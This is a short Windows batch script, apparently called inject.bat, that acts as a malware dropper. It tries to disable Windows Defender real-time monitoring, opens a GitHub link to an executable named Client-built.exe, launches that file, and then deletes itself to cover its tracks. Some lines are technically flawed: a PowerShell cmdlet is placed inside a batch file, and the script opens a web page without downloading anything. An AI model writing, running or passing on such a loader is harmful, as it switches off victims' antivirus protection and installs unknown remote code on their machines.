@echo off
Set -MpPreference -DisableRealtimeMonitoring $true -Verbose
timeout /t 1 >nul
start https://github.com/vzxid/inject/blob/main/Client-built.exe
timeout /t 5 >nul
start Client-built.exe
timeout /t 1 >nul
DEL inject.bat
exit